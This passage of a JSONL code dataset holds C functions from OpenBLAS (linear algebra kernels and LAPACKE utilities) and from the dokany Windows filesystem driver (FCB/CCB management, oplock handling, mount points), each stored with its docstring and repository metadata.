ipiv_B, iONE);\n    // shift pivots\n    blasint i;\n    for (i = 0; i < n2; i++)\n        ipiv_B[i] += n1;\n}", "path": "OpenBLAS/relapack/src/zgetrf.c", "commit_date": "2020-08-27 00:00:00", "repo_name": "OpenMathLib/OpenBLAS", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 48782}
{"docstring": "/**\n * Find  minimum index \n * Warning: requirements n>0  and n % 32 == 0\n * @param n     \n * @param x     pointer to the vector\n * @param minf  (out) minimum absolute value .( only for output )\n * @return  index \n */\n", "func_signal": "static BLASLONG   ciamin_kernel_32(BLASLONG n, FLOAT *x, FLOAT *minf)", "code": "{ \n\n    BLASLONG index;\n    BLASLONG i=0;\n    register __vector unsigned int static_index0 = {0,1,2,3};\n    register __vector unsigned int temp0 = {4,4,4, 4}; //temporary vector register\n    register __vector unsigned int temp1=  temp0<<1;  //{8,8,8,8}\n    register __vector unsigned int static_index1=static_index0 +temp0;//{4,5,6,7};\n    register __vector unsigned int static_index2=static_index0 +temp1;//{8,9,10,11};\n    register __vector unsigned int static_index3=static_index1 +temp1; //{12,13,14,15};\n    temp0=vec_xor(temp0,temp0);\n    temp1=temp1 <<1 ; //{16,16,16,16}\n    register __vector unsigned int temp_add=temp1 <<1; //{32,32,32,32}\n    register __vector unsigned int quadruple_indices=temp0;//{0,0,0,0}\n    float first_min=CABS1(x,0);\n    register __vector float quadruple_values={first_min,first_min,first_min,first_min};\n\n    register __vector float * v_ptrx=(__vector float *)x;\n    register __vector unsigned char real_pack_mask = { 0,1,2,3,8,9,10,11,16,17,18,19, 24,25,26,27}; \n    register __vector unsigned char image_pack_mask=  {4, 5, 6, 7, 12, 13, 14, 15, 20, 21, 22, 23, 28, 29, 30, 31}; \n    for(; i<n; i+=32){\n       //absolute temporary complex vectors\n       register __vector float v0=vec_abs(v_ptrx[0]);\n       register __vector float v1=vec_abs(v_ptrx[1]);\n       register __vector float v2=vec_abs(v_ptrx[2]);\n       register __vector float v3=vec_abs(v_ptrx[3]);\n       register __vector float v4=vec_abs(v_ptrx[4]);\n       register __vector float v5=vec_abs(v_ptrx[5]);\n       register __vector float v6=vec_abs(v_ptrx[6]);       \n       register __vector float v7=vec_abs(v_ptrx[7]);\n\n       //pack complex real and imaginary parts together to sum real+image\n       register __vector float t1=vec_perm(v0,v1,real_pack_mask);\n       register __vector float ti=vec_perm(v0,v1,image_pack_mask);      \n       v0=t1+ti; //sum quadruple real with quadruple image\n       register __vector float t2=vec_perm(v2,v3,real_pack_mask);\n       register __vector float ti2=vec_perm(v2,v3,image_pack_mask); \n       v1=t2+ti2;\n       t1=vec_perm(v4,v5,real_pack_mask);\n       ti=vec_perm(v4,v5,image_pack_mask);      \n       v2=t1+ti; //sum\n       t2=vec_perm(v6,v7,real_pack_mask);\n       ti2=vec_perm(v6,v7,image_pack_mask); \n       v3=t2+ti2;\n       // now we have 16 summed elements . lets compare them\n       v_ptrx+=8;\n       register __vector bool int r1=vec_cmpgt(v0,v1);\n       register __vector bool int r2=vec_cmpgt(v2,v3);\n       register __vector unsigned int ind2= vec_sel(static_index0,static_index1,r1);\n       v0=vec_sel(v0,v1,r1); \n       register __vector unsigned int ind3= vec_sel(static_index2,static_index3,r2);\n       v1=vec_sel(v2,v3,r2);\n       //final cmp and select index and value for first 16 values\n       r1=vec_cmpgt(v0,v1);\n       register __vector unsigned int indf0 = vec_sel(ind2,ind3,r1);\n       register __vector float vf0= vec_sel(v0,v1,r1); \n\n       //absolute temporary complex vectors\n       v0=vec_abs(v_ptrx[0]);\n       v1=vec_abs(v_ptrx[1]);\n       v2=vec_abs(v_ptrx[2]);\n       v3=vec_abs(v_ptrx[3]);\n       v4=vec_abs(v_ptrx[4]);\n       v5=vec_abs(v_ptrx[5]);\n       v6=vec_abs(v_ptrx[6]);       \n       v7=vec_abs(v_ptrx[7]);\n\n       //pack complex real and imaginary parts together to sum real+image\n       t1=vec_perm(v0,v1,real_pack_mask);\n       ti=vec_perm(v0,v1,image_pack_mask);      \n       v0=t1+ti; //sum quadruple real with quadruple image\n       t2=vec_perm(v2,v3,real_pack_mask);\n       ti2=vec_perm(v2,v3,image_pack_mask); \n       v1=t2+ti2;\n       t1=vec_perm(v4,v5,real_pack_mask);\n       ti=vec_perm(v4,v5,image_pack_mask);      \n       v2=t1+ti; //sum\n       t2=vec_perm(v6,v7,real_pack_mask);\n       ti2=vec_perm(v6,v7,image_pack_mask); \n       v3=t2+ti2;\n       // now we have 16 summed elements {from 16 to 31} . lets compare them\n       v_ptrx+=8;\n       r1=vec_cmpgt(v0,v1);\n       r2=vec_cmpgt(v2,v3);\n       ind2= vec_sel(static_index0,static_index1,r1);\n       v0=vec_sel(v0,v1,r1); \n       ind3= vec_sel(static_index2,static_index3,r2);\n       v1=vec_sel(v2,v3,r2);\n       //final cmp and select index and value for the second 16 values\n       r1=vec_cmpgt(v0,v1);\n       register __vector unsigned int indv0 = vec_sel(ind2,ind3,r1);\n       register __vector float vv0= vec_sel(v0,v1,r1); \n       indv0+=temp1; //make index from 16->31\n\n       //find final quadruple from 32 elements\n       r2=vec_cmpgt(vf0,vv0);\n       ind2 = vec_sel( indf0,indv0,r2);\n       vv0= vec_sel(vf0,vv0,r2);       \n       //get asbolute index\n       ind2+=temp0;\n       //compare with old quadruple and update \n       r1=vec_cmpgt(quadruple_values,vv0);\n       quadruple_indices = vec_sel( quadruple_indices,ind2,r1);\n       quadruple_values= vec_sel(quadruple_values,vv0,r1);      \n\n       temp0+=temp_add;     \n    }\n\n //now we have to chose from 4 values and 4 different indices\n    // we will compare pairwise if pairs are exactly the same we will choose minimum between index\n    // otherwise we will assign index of the minimum value\n    float a1,a2,a3,a4;\n    unsigned int i1,i2,i3,i4;\n    a1=vec_extract(quadruple_values,0);\n    a2=vec_extract(quadruple_values,1);\n    a3=vec_extract(quadruple_values,2);\n    a4=vec_extract(quadruple_values,3);\n    i1=vec_extract(quadruple_indices,0);\n    i2=vec_extract(quadruple_indices,1);\n    i3=vec_extract(quadruple_indices,2);\n    i4=vec_extract(quadruple_indices,3);\n    if(a1==a2){\n       index=i1>i2?i2:i1;\n    }else if(a2<a1){\n      index=i2;\n      a1=a2;\n    }else{\n       index= i1;\n    }\n\n    if(a4==a3){\n      i1=i3>i4?i4:i3;\n    }else if(a4<a3){\n      i1=i4;\n      a3=a4;\n    }else{\n       i1= i3;\n    }\n\n    if(a1==a3){\n      index=i1>index?index:i1;\n       *minf=a1; \n    }else if(a3<a1){\n       index=i1;\n       *minf=a3;\n    }else{ \n        *minf=a1;\n    }\n    return index;\n\n}", "path": "OpenBLAS/kernel/power/icamin.c", "commit_date": "2019-05-01 00:00:00", "repo_name": "OpenMathLib/OpenBLAS", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 48782}
{"docstring": "/* Check a matrix for NaN entries. */\n", "func_signal": "lapack_logical LAPACKE_stf_nancheck( int matrix_layout, char transr,\n                                      char uplo, char diag,\n                                      lapack_int n,\n                                      const float *a )", "code": "{\n    lapack_int len;\n    lapack_logical rowmaj, ntr, lower, unit;\n    lapack_int n1, n2, k;\n\n    if( a == NULL ) return (lapack_logical) 0;\n\n    rowmaj = (matrix_layout == LAPACK_ROW_MAJOR);\n    ntr    = LAPACKE_lsame( transr, 'n' );\n    lower  = LAPACKE_lsame( uplo,   'l' );\n    unit   = LAPACKE_lsame( diag,   'u' );\n\n    if( ( !rowmaj && ( matrix_layout != LAPACK_COL_MAJOR ) ) ||\n        ( !ntr    && !LAPACKE_lsame( transr, 't' )\n                  && !LAPACKE_lsame( transr, 'c' ) ) ||\n        ( !lower  && !LAPACKE_lsame( uplo,   'u' ) ) ||\n        ( !unit   && !LAPACKE_lsame( diag,   'n' ) ) ) {\n        /* Just exit if any of input parameters are wrong */\n        return (lapack_logical) 0;\n    }\n\n    if( unit ) {\n        /* Unit case, diagonal should be excluded from the check for NaN.\n         * Decoding RFP and checking both triangulars and rectangular\n         * for NaNs.\n         */\n        if( lower ) {\n            n2 = n / 2;\n            n1 = n - n2;\n        } else {\n            n1 = n / 2;\n            n2 = n - n1;\n        }\n        if( n % 2 == 1 ) {\n            /* N is odd */\n            if( ( rowmaj || ntr ) && !( rowmaj && ntr ) ) {\n                /* N is odd and ( TRANSR = 'N' .XOR. ROWMAJOR) */\n                if( lower ) {\n                    return LAPACKE_str_nancheck( LAPACK_ROW_MAJOR, 'l', 'u',\n                                                 n1, &a[0], n )\n                        || LAPACKE_sge_nancheck( LAPACK_ROW_MAJOR, n2, n1,\n                                                 &a[n1], n )\n                        || LAPACKE_str_nancheck( LAPACK_ROW_MAJOR, 'u', 'u',\n                                                 n2, &a[n], n );\n                } else {\n                    return LAPACKE_str_nancheck( LAPACK_ROW_MAJOR, 'l', 'u',\n                                                 n1, &a[n2], n )\n                        || LAPACKE_sge_nancheck( LAPACK_ROW_MAJOR, n1, n2,\n                                                 &a[0], n )\n                        || LAPACKE_str_nancheck( LAPACK_ROW_MAJOR, 'u', 'u',\n                                                 n2, &a[n1], n );\n                }\n            } else {\n                /* N is odd and\n                   ( ( TRANSR = 'C' || TRANSR = 'T' ) .XOR. COLMAJOR ) */\n                if( lower ) {\n                    return LAPACKE_str_nancheck( LAPACK_ROW_MAJOR, 'u', 'u',\n                                                 n1, &a[0], n1 )\n                        || LAPACKE_sge_nancheck( LAPACK_ROW_MAJOR, n1, n2,\n                                                 &a[1], n1 )\n                        || LAPACKE_str_nancheck( LAPACK_ROW_MAJOR, 'l', 'u',\n                                                 n2, &a[1], n1 );\n                } else {\n                    return LAPACKE_str_nancheck( LAPACK_ROW_MAJOR, 'u', 'u',\n                                                 n1, &a[(size_t)n2*n2], n2 )\n                        || LAPACKE_sge_nancheck( LAPACK_ROW_MAJOR, n2, n1,\n                                                 &a[0], n2 )\n                        || LAPACKE_str_nancheck( LAPACK_ROW_MAJOR, 'l', 'u',\n                                                 n2, &a[(size_t)n1*n2], n2 );\n                }\n            }\n        } else {\n            /* N is even */\n            k = n / 2;\n            if( ( rowmaj || ntr ) && !( rowmaj && ntr ) ) {\n                /* N is even and ( TRANSR = 'N' .XOR. ROWMAJOR) */\n                if( lower ) {\n                    return LAPACKE_str_nancheck( LAPACK_ROW_MAJOR, 'l', 'u',\n                                                 k, &a[1], n+1 )\n                        || LAPACKE_sge_nancheck( LAPACK_ROW_MAJOR, k, k,\n                                                 &a[k+1], n+1 )\n                        || LAPACKE_str_nancheck( LAPACK_ROW_MAJOR, 'u', 'u',\n                                                 k, &a[0], n+1 );\n                } else {\n                    return LAPACKE_str_nancheck( LAPACK_ROW_MAJOR, 'l', 'u',\n                                                 k, &a[k+1], n+1 )\n                        || LAPACKE_sge_nancheck( LAPACK_ROW_MAJOR, k, k,\n                                                 &a[0], n+1 )\n                        || LAPACKE_str_nancheck( LAPACK_ROW_MAJOR, 'u', 'u',\n                                                 k, &a[k], n+1 );\n                }\n            } else {\n                /* N is even and\n                 * ( ( TRANSR = 'C' || TRANSR = 'T' ) .XOR. COLMAJOR )\n                 */\n                if( lower ) {\n                    return LAPACKE_str_nancheck( LAPACK_ROW_MAJOR, 'u', 'u',\n                                                 k, &a[k], k )\n                        || LAPACKE_sge_nancheck( LAPACK_ROW_MAJOR, k, k,\n                                                 &a[(size_t)k*(k+1)], k )\n                        || LAPACKE_str_nancheck( LAPACK_ROW_MAJOR, 'l', 'u',\n                                                 k, &a[0], k );\n                } else {\n                    return LAPACKE_str_nancheck( LAPACK_ROW_MAJOR, 'u', 'u',\n                                                 k, &a[(size_t)k*(k+1)], k )\n                        || LAPACKE_sge_nancheck( LAPACK_ROW_MAJOR, k, k,\n                                                 &a[0], k )\n                        || LAPACKE_str_nancheck( LAPACK_ROW_MAJOR, 'l', 'u',\n                                                 k, &a[(size_t)k*k], k );\n                }\n            }\n        }\n    } else {\n        /* Non-unit case - just check whole array for NaNs. */\n        len = n*(n+1)/2;\n        return LAPACKE_sge_nancheck( LAPACK_COL_MAJOR, len, 1, a, len );\n    }\n}", "path": "OpenBLAS/lapack-netlib/LAPACKE/utils/lapacke_stf_nancheck.c", "commit_date": "2015-11-20 00:00:00", "repo_name": "OpenMathLib/OpenBLAS", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 48782}
{"docstring": "/* Converts input general band matrix from row-major(C) to\n * column-major(Fortran) layout or vice versa.\n */\n", "func_signal": "void LAPACKE_sgb_trans( int matrix_layout, lapack_int m, lapack_int n,\n                        lapack_int kl, lapack_int ku,\n                        const float *in, lapack_int ldin,\n                        float *out, lapack_int ldout )", "code": "{\n    lapack_int i, j;\n\n    if( in == NULL || out == NULL ) return;\n\n    if( matrix_layout == LAPACK_COL_MAJOR ) {\n        for( j = 0; j < MIN( ldout, n ); j++ ) {\n            for( i = MAX( ku-j, 0 ); i < MIN3( ldin, m+ku-j, kl+ku+1 );\n                 i++ ) {\n                out[(size_t)i*ldout+j] = in[i+(size_t)j*ldin];\n            }\n        }\n    } else if ( matrix_layout == LAPACK_ROW_MAJOR ) {\n        /* TODO: interchange loops for performance.\n         * This is just reference impemeltation.\n         */\n        for( j = 0; j < MIN( n, ldin ); j++ ) {\n            for( i = MAX( ku-j, 0 ); i < MIN3( ldout, m+ku-j, kl+ku+1 );\n                 i++ ) {\n                out[i+(size_t)j*ldout] = in[(size_t)i*ldin+j];\n            }\n        }\n    }\n}", "path": "OpenBLAS/lapack-netlib/LAPACKE/utils/lapacke_sgb_trans.c", "commit_date": "2015-11-20 00:00:00", "repo_name": "OpenMathLib/OpenBLAS", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 48782}
{"docstring": "/* Check a matrix for NaN entries. */\n", "func_signal": "lapack_logical LAPACKE_zhs_nancheck( int matrix_layout, lapack_int n,\n                                      const lapack_complex_double *a,\n                                      lapack_int lda )", "code": "{\n    lapack_logical subdiag_nans;\n\n    if( a == NULL ) return (lapack_logical) 0;\n\n    /* Check subdiagonal first */\n    if( matrix_layout == LAPACK_COL_MAJOR ) {\n        subdiag_nans = LAPACKE_z_nancheck( n-1, &a[1], lda+1 );\n    } else if ( matrix_layout == LAPACK_ROW_MAJOR ) {\n        subdiag_nans = LAPACKE_z_nancheck( n-1, &a[lda], lda+1 );\n    } else {\n        return (lapack_logical) 0;\n    }\n\n    /* Check upper triangular if subdiagonal has no NaNs. */\n    return subdiag_nans || LAPACKE_ztr_nancheck( matrix_layout, 'u', 'n',\n                                                 n, a, lda);\n}", "path": "OpenBLAS/lapack-netlib/LAPACKE/utils/lapacke_zhs_nancheck.c", "commit_date": "2015-11-20 00:00:00", "repo_name": "OpenMathLib/OpenBLAS", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 48782}
{"docstring": "/* Auxiliary routine: printing a matrix */\n", "func_signal": "void print_matrix( char* desc, lapack_int m, lapack_int n, double* a, lapack_int lda )", "code": "{\n        lapack_int i, j;\n        printf( \"\\n %s\\n\", desc );\n        for( i = 0; i < m; i++ ) {\n                for( j = 0; j < n; j++ ) printf( \" %6.2f\", a[i*lda+j] );\n                printf( \"\\n\" );\n        }\n}", "path": "OpenBLAS/lapack-netlib/LAPACKE/example/example_user.c", "commit_date": "2017-01-06 00:00:00", "repo_name": "OpenMathLib/OpenBLAS", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 48782}
{"docstring": "/** sgbtrf's recursive compute kernel */\n", "func_signal": "static void RELAPACK_sgbtrf_rec(\n    const blasint *m, const blasint *n, const blasint *kl, const blasint *ku,\n    float *Ab, const blasint *ldAb, blasint *ipiv,\n    float *Workl, const blasint *ldWorkl, float *Worku, const blasint *ldWorku,\n    blasint *info\n)", "code": "{\n\n    if (*m == 0 || *n == 0) return;\n\n    if ( *n <= MAX(CROSSOVER_SGBTRF, 1) || *n > *kl || *ldAb == 1) {\n        // Unblocked\n        LAPACK(sgbtf2)(m, n, kl, ku, Ab, ldAb, ipiv, info);\n        return;\n    }\n\n    // Constants\n    const float ONE[]  = { 1. };\n    const float MONE[] = { -1. };\n    const blasint    iONE[] = { 1 };\n\n    // Loop iterators\n    blasint i, j;\n\n    // Output upper band width\n    const blasint kv = *ku + *kl;\n\n    // Unskew A\n    const blasint ldA[] = { *ldAb - 1 };\n    float *const A = Ab + kv;\n\n    // Splitting\n    const blasint n1  = MIN(SREC_SPLIT(*n), *kl);\n    const blasint n2  = *n - n1;\n    const blasint m1  = MIN(n1, *m);\n    const blasint m2  = *m - m1;\n    const blasint mn1 = MIN(m1, n1);\n    const blasint mn2 = MIN(m2, n2);\n\n    // Ab_L *\n    //      Ab_BR\n    float *const Ab_L  = Ab;\n    float *const Ab_BR = Ab + *ldAb * n1;\n\n    // A_L A_R\n    float *const A_L = A;\n    float *const A_R = A + *ldA * n1;\n\n    // A_TL A_TR\n    // A_BL A_BR\n    float *const A_TL = A;\n    float *const A_TR = A + *ldA * n1;\n    float *const A_BL = A             + m1;\n    float *const A_BR = A + *ldA * n1 + m1;\n\n    // ipiv_T\n    // ipiv_B \n    blasint *const ipiv_T = ipiv;\n    blasint *const ipiv_B = ipiv + n1;\n\n    // Banded splitting\n    const blasint n21 = MIN(n2, kv - n1);\n    const blasint n22 = MIN(n2 - n21, n1);\n    const blasint m21 = MIN(m2, *kl - m1);\n    const blasint m22 = MIN(m2 - m21, m1);\n\n    //   n1 n21  n22\n    // m *  A_Rl ARr\n    float *const A_Rl = A_R;\n    float *const A_Rr = A_R + *ldA * n21;\n\n    //     n1    n21    n22\n    // m1  *     A_TRl  A_TRr\n    // m21 A_BLt A_BRtl A_BRtr\n    // m22 A_BLb A_BRbl A_BRbr\n    float *const A_TRl  = A_TR;\n    float *const A_TRr  = A_TR + *ldA * n21;\n    float *const A_BLt  = A_BL;\n    float *const A_BLb  = A_BL              + m21;\n    float *const A_BRtl = A_BR;\n    float *const A_BRtr = A_BR + *ldA * n21;\n    float *const A_BRbl = A_BR              + m21;\n    float *const A_BRbr = A_BR + *ldA * n21 + m21;\n\n\n    // recursion(Ab_L, ipiv_T)\n    RELAPACK_sgbtrf_rec(m, &n1, kl, ku, Ab_L, ldAb, ipiv_T, Workl, ldWorkl, Worku, ldWorku, info);\n    if (*info) return;\n    // Workl = A_BLb\n    LAPACK(slacpy)(\"U\", &m22, &n1, A_BLb, ldA, Workl, ldWorkl);\n\n    // partially redo swaps in A_L\n    for (i = 0; i < mn1; i++) {\n        const blasint ip = ipiv_T[i] - 1;\n        if (ip != i) {\n            if (ip < *kl)\n                BLAS(sswap)(&i, A_L + i, ldA, A_L + ip, ldA);\n            else\n                BLAS(sswap)(&i, A_L + i, ldA, Workl + ip - *kl, ldWorkl);\n        }\n    }\n\n    // apply pivots to A_Rl\n    LAPACK(slaswp)(&n21, A_Rl, ldA, iONE, &mn1, ipiv_T, iONE);\n\n    // apply pivots to A_Rr columnwise\n    for (j = 0; j < n22; j++) {\n        float *const A_Rrj = A_Rr + *ldA * j;\n        for (i = j; i < mn1; i++) {\n            const blasint ip = ipiv_T[i] - 1;\n            if (ip != i) {\n                const float tmp = A_Rrj[i];\n                A_Rrj[i] = A_Rr[ip];\n                A_Rrj[ip] = tmp;\n            }\n        }\n    }\n\n    // A_TRl = A_TL \\ A_TRl\n    BLAS(strsm)(\"L\", \"L\", \"N\", \"U\", &m1, &n21, ONE, A_TL, ldA, A_TRl, ldA);\n    // Worku = A_TRr\n    LAPACK(slacpy)(\"L\", &m1, &n22, A_TRr, ldA, Worku, ldWorku);\n    // Worku = A_TL \\ Worku\n    BLAS(strsm)(\"L\", \"L\", \"N\", \"U\", &m1, &n22, ONE, A_TL, ldA, Worku, ldWorku);\n    // A_TRr = Worku\n    LAPACK(slacpy)(\"L\", &m1, &n22, Worku, ldWorku, A_TRr, ldA);\n    // A_BRtl = A_BRtl - A_BLt * A_TRl\n    BLAS(sgemm)(\"N\", \"N\", &m21, &n21, &n1, MONE, A_BLt, ldA, A_TRl, ldA, ONE, A_BRtl, ldA);\n    // A_BRbl = A_BRbl - Workl * A_TRl\n    BLAS(sgemm)(\"N\", \"N\", &m22, &n21, &n1, MONE, Workl, ldWorkl, A_TRl, ldA, ONE, A_BRbl, ldA);\n    // A_BRtr = A_BRtr - A_BLt * Worku\n    BLAS(sgemm)(\"N\", \"N\", &m21, &n22, &n1, MONE, A_BLt, ldA, Worku, ldWorku, ONE, A_BRtr, ldA);\n    // A_BRbr = A_BRbr - Workl * Worku\n    BLAS(sgemm)(\"N\", \"N\", &m22, &n22, &n1, MONE, Workl, ldWorkl, Worku, ldWorku, ONE, A_BRbr, ldA);\n\n    // partially undo swaps in A_L\n    for (i = mn1 - 1; i >= 0; i--) {\n        const blasint ip = ipiv_T[i] - 1;\n        if (ip != i) {\n            if (ip < *kl)\n                BLAS(sswap)(&i, A_L + i, ldA, A_L + ip, ldA);\n            else\n                BLAS(sswap)(&i, A_L + i, ldA, Workl + ip - *kl, ldWorkl);\n        }\n    }\n\n\n    // recursion(Ab_BR, ipiv_B)\n//cause of infinite recursion here ?    \n      RELAPACK_sgbtrf_rec(&m2, &n2, kl, ku, Ab_BR, ldAb, ipiv_B, Workl, ldWorkl, Worku, ldWorku, info);\n//        LAPACK(sgbtf2)(&m2, &n2, kl, ku, Ab_BR, ldAb, ipiv_B, info);\n    if (*info)\n        *info += n1;\n    // shift pivots\n    for (i = 0; i < mn2; i++)\n        ipiv_B[i] += n1;\n}", "path": "OpenBLAS/relapack/src/sgbtrf.c", "commit_date": "2020-08-27 00:00:00", "repo_name": "OpenMathLib/OpenBLAS", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 48782}
{"docstring": "// Called when there are some pending garbage FCBs. This function keeps an eye\n// on them until they expire and then deletes them, returning when there are no\n// more pending ones.\n", "func_signal": "NTSTATUS AgeAndDeleteFcbGarbage(__in PDokanVCB Vcb, __in PKTIMER Timer)", "code": "{\n  NTSTATUS status = STATUS_INVALID_PARAMETER;\n  ULONG pendingCount = 0;\n  PVOID events[2];\n  BOOLEAN waited = FALSE;\n  events[0] = &Vcb->Dcb->ReleaseEvent;\n  events[1] = Timer;\n  ++Vcb->VolumeMetrics.NormalFcbGarbageCollectionCycles;\n  for (;;) {\n    // Get rid of any garbage that is ready to delete.\n    DokanVCBLockRW(Vcb);\n    ++Vcb->VolumeMetrics.NormalFcbGarbageCollectionPasses;\n    pendingCount = DeleteFcbGarbageAndGetRemainingCount(Vcb, /*Force=*/FALSE);\n    DokanVCBUnlock(Vcb);\n    // If we have cleared out all the garbage, return so the garbage collector\n    // will do an indefinite wait for new garbage. But we wait at least once on\n    // the GC interval timer to avoid having multiple no-op cycles in one\n    // interval.\n    if (pendingCount == 0 && waited) {\n      status = STATUS_SUCCESS;\n      break;\n    }\n    // If there are any entries that haven't aged long enough, age them using\n    // the timer until they are ready.\n    status = KeWaitForMultipleObjects(2, events, WaitAny, Executive, KernelMode,\n                                      FALSE, NULL, NULL);\n    waited = TRUE;\n    if (status != STATUS_WAIT_1) {\n      status = STATUS_CANCELLED;\n      break;\n    }\n  }\n  return status;\n}", "path": "dokany/sys/util/fcb.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "dokan-dev/dokany", "stars": 4999, "license": "None", "language": "c", "size": 6221}
{"docstring": "// DokanAllocateCCB must be called with exlusive Fcb lock held.\n", "func_signal": "PDokanCCB DokanAllocateCCB(__in PDokanDCB Dcb, __in PDokanFCB Fcb)", "code": "{\n  PDokanCCB ccb = ExAllocateFromLookasideListEx(&g_DokanCCBLookasideList);\n\n  if (ccb == NULL)\n    return NULL;\n\n  ASSERT(ccb != NULL);\n  ASSERT(Fcb != NULL);\n\n  RtlZeroMemory(ccb, sizeof(DokanCCB));\n\n  ccb->Identifier.Type = CCB;\n  ccb->Identifier.Size = sizeof(DokanCCB);\n\n  ccb->Fcb = Fcb;\n  DDbgPrint(\"   Allocated CCB \\n\");\n  ExInitializeResourceLite(&ccb->Resource);\n\n  InitializeListHead(&ccb->NextCCB);\n\n  InsertTailList(&Fcb->NextCCB, &ccb->NextCCB);\n\n  ccb->MountId = Dcb->MountId;\n  ccb->ProcessId = PsGetCurrentProcessId();\n\n  InterlockedIncrement(&Fcb->Vcb->CcbAllocated);\n  return ccb;\n}", "path": "dokany/sys/create.c", "commit_date": "2020-11-21 00:00:00", "repo_name": "dokan-dev/dokany", "stars": 4999, "license": "None", "language": "c", "size": 6221}
{"docstring": "// Returns |TRUE| if |fileName1| and |fileName2| represent paths to two\n// files/folders that are in the same directory.\n", "func_signal": "BOOLEAN IsInSameDirectory(PUNICODE_STRING fileName1,\n                          PUNICODE_STRING fileName2)", "code": "{\n  LONG parentEndingIndex = GetParentDirectoryEndingIndex(fileName1);\n  if (parentEndingIndex != GetParentDirectoryEndingIndex(fileName2)) {\n    return FALSE;\n  }\n  for (LONG i = 0; i < parentEndingIndex; i++) {\n    // TODO(ttdinhtrong): This code assumes case sensitive, which is not always\n    // true. As of now we do not know if the user is in case sensitive or case\n    // insensitive mode.\n    if (fileName1->Buffer[i] != fileName2->Buffer[i]) {\n      return FALSE;\n    }\n  }\n  return TRUE;\n}", "path": "dokany/sys/fileinfo.c", "commit_date": "2020-11-21 00:00:00", "repo_name": "dokan-dev/dokany", "stars": 4999, "license": "None", "language": "c", "size": 6221}
{"docstring": "// DokanNotifyReportChange should be called with the Fcb at least share-locked.\n// due to the ro access to the FileName field.\n", "func_signal": "NTSTATUS DokanNotifyReportChange(__in PDokanFCB Fcb, __in ULONG FilterMatch,\n                                 __in ULONG Action)", "code": "{\n  ASSERT(Fcb != NULL);\n  return DokanNotifyReportChange0(Fcb, &Fcb->FileName, FilterMatch, Action);\n}", "path": "dokany/sys/dokan.c", "commit_date": "2020-10-14 00:00:00", "repo_name": "dokan-dev/dokany", "stars": 4999, "license": "None", "language": "c", "size": 6221}
{"docstring": "// Oplock break completion routine used for async oplock breaks that are\n// triggered in DokanDispatchCreate. This either queues the IRP_MJ_CREATE to get\n// re-dispatched or queues it to get failed asynchronously by calling\n// DokanCompleteCreate in a safe context.\n", "func_signal": "VOID DokanRetryCreateAfterOplockBreak(__in PVOID Context, __in PIRP Irp)", "code": "{\n  if (NT_SUCCESS(Irp->IoStatus.Status)) {\n    DokanRegisterPendingRetryIrp((PDEVICE_OBJECT)Context, Irp);\n  } else {\n    DokanRegisterAsyncCreateFailure((PDEVICE_OBJECT)Context, Irp,\n                                    Irp->IoStatus.Status);\n  }\n}", "path": "dokany/sys/create.c", "commit_date": "2020-11-21 00:00:00", "repo_name": "dokan-dev/dokany", "stars": 4999, "license": "None", "language": "c", "size": 6221}
{"docstring": "// Called when there are no pending garbage FCBs and we may need to wait\n// indefinitely for one to appear.\n", "func_signal": "NTSTATUS WaitForNewFcbGarbage(__in PDokanVCB Vcb)", "code": "{\n  PVOID events[2];\n  events[0] = &Vcb->Dcb->ReleaseEvent;\n  events[1] = &Vcb->FcbGarbageListNotEmpty;\n  NTSTATUS status = KeWaitForMultipleObjects(2, events, WaitAny, Executive,\n                                             KernelMode, FALSE, NULL, NULL);\n  return status == STATUS_WAIT_1 ? STATUS_SUCCESS : STATUS_CANCELLED;\n}", "path": "dokany/sys/util/fcb.c", "commit_date": "2020-08-17 00:00:00", "repo_name": "dokan-dev/dokany", "stars": 4999, "license": "None", "language": "c", "size": 6221}
{"docstring": "// Returns the last index, |i|, so that [0, i] represents the range of the path\n// to the parent directory. For example, if |fileName| is |C:\\temp\\text.txt|,\n// returns 7 (the index of |\\| right before |text.txt|).\n//\n// Returns -1 if no '\\\\' is found,\n", "func_signal": "LONG GetParentDirectoryEndingIndex(PUNICODE_STRING fileName)", "code": "{\n  if (fileName->Length == 0) {\n    return -1;\n  }\n  // If the path ends with L'\\\\' (in which case, this is a directory, that last\n  // '\\\\' character can be ignored.)\n  USHORT lastIndex = fileName->Length / sizeof(WCHAR) - 1;\n  if (fileName->Buffer[lastIndex] == L'\\\\') {\n    lastIndex--;\n  }\n  for (LONG index = lastIndex; index >= 0; index--) {\n    if (fileName->Buffer[index] == L'\\\\') {\n      return index;\n    }\n  }\n  // There is no '\\\\' found.\n  return -1;\n}", "path": "dokany/sys/fileinfo.c", "commit_date": "2020-11-21 00:00:00", "repo_name": "dokan-dev/dokany", "stars": 4999, "license": "None", "language": "c", "size": 6221}
{"docstring": "// Note that invoking this with a drive letter MountPoint and no DeviceName has\n// the weird side-effect of inserting a mount manager database record telling it\n// to never in the future auto-assign a drive letter to the thing currently\n// using that drive letter.\n", "func_signal": "NTSTATUS\nDokanSendVolumeDeletePoints(__in PUNICODE_STRING MountPoint,\n                            __in PUNICODE_STRING DeviceName)", "code": "{\n  NTSTATUS status;\n  PMOUNTMGR_MOUNT_POINT point;\n  PMOUNTMGR_MOUNT_POINTS deletedPoints;\n  ULONG length;\n  ULONG olength;\n\n  DDbgPrint(\"=> DokanSendVolumeDeletePoints\\n\");\n  length = sizeof(MOUNTMGR_MOUNT_POINT);\n  if (MountPoint != NULL) {\n    length += MountPoint->Length;\n  }\n  if (DeviceName != NULL) {\n    length += DeviceName->Length;\n  }\n  point = DokanAllocZero(length);\n  if (point == NULL) {\n    DDbgPrint(\"  can't allocate MOUNTMGR_CREATE_POINT_INPUT\\n\");\n    return STATUS_INSUFFICIENT_RESOURCES;\n  }\n\n  olength = sizeof(MOUNTMGR_MOUNT_POINTS) + 1024;\n  deletedPoints = DokanAllocZero(olength);\n  if (deletedPoints == NULL) {\n    DDbgPrint(\"  can't allocate PMOUNTMGR_MOUNT_POINTS\\n\");\n    ExFreePool(point);\n    return STATUS_INSUFFICIENT_RESOURCES;\n  }\n\n  ULONG nextStringOffset = sizeof(MOUNTMGR_MOUNT_POINT);\n  if (MountPoint != NULL) {\n    DDbgPrint(\"  MountPoint: %wZ\\n\", MountPoint);\n    point->SymbolicLinkNameOffset = 